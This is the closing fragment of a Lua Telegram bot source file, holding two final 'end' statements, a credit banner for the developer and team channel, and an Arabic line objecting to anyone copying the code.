end -- end new msg dev.mr WaTaN 
end -- end callback dev.mr WaTaN
-----------------------------------------------------
-- This Source Was Developed By (Abs) @abbasfadhil. --
--     This Is The Source Channel @WaTaNTeaM .      --
--                     - WaTaN -                    --
--           -- https://t.me/WaTaNTeaM --           --
------------------------------------------------------
----- لم ولن ابرئ الذمة لأي شخص ينسخ الملفات والسورس والاكواد الخاصه بي حتى لو كان قريبا مني لن ابرئ الذمة له -----
